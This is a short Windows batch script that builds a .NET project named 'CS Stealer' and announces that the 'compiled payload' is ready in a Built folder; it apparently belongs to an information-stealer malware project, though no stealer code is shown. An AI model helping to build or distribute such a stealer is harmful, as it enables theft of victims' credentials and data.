@echo off

dotnet publish "./CsStealer/CS Stealer.csproj" -o Built 

cls

echo.
echo.
echo Build finished ! The compiled payload is available in ./Built
echo.
echo Press any key to exit... 
pause >nul